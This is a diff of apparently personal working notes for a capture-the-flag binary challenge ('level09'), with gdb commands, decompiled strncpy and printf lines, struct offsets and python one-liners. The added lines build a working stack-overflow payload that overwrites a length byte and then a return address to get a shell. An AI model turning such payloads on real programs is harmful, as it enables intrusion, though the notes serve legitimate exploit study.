@@ -37,7 +37,7 @@ b *handle_msg+112
 
 126 : Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1
 
-(gdb) find 0x7ffffffde000, +135168, 0x41306141
+(gdb) find 0x7ffffffde000, +135168, 0x41414141
 0x7fffffffe350
 0x7fffffffe47c
 
@@ -49,7 +49,8 @@ python -c 'print "A"*40' ; python -c
 
 r < <(python -c 'print "\x90"*41' ; python -c 'print "\x90"*128 + "\x8c\x48\x55\x55\x55\x55\x00\x00"')
 
-< <(python -c 'print "A"*40' ; python -c 'print "\x8c\x48\x55\x55\x55\x55\x00\x00"')
+r < <(python -c 'print "A"*40 + "\xff"' ; python -c 'print "B"*200 + "\x8c\x48\x55\x55\x55\x55\x00\x00"')
+
 
 0x55 55 55 55 48 8c
 
@@ -69,3 +70,17 @@ x $rbp-0x98
 set_msg()
 x $rbp-0x408
 0x7fffffffdfd8: 0x00007fffffffe3f0
+
+return strncpy(arg1, &var_408, ((int64_t)*(uint32_t*)(arg1 + 0xb4))); // 180
+
+return printf(">: Welcome, %s", (arg1 + 0x8c)); // 140
+
+
+struct :
+msg 0->140
+username 140->180 
+
+alloue 192 bytes dans handle_msg  
+
+
+(python -c 'print "A"*40 + "\xff"' ; python -c 'print "B"*200 + "\x8c\x48\x55\x55\x55\x55\x00\x00"' ; cat) | ./level09
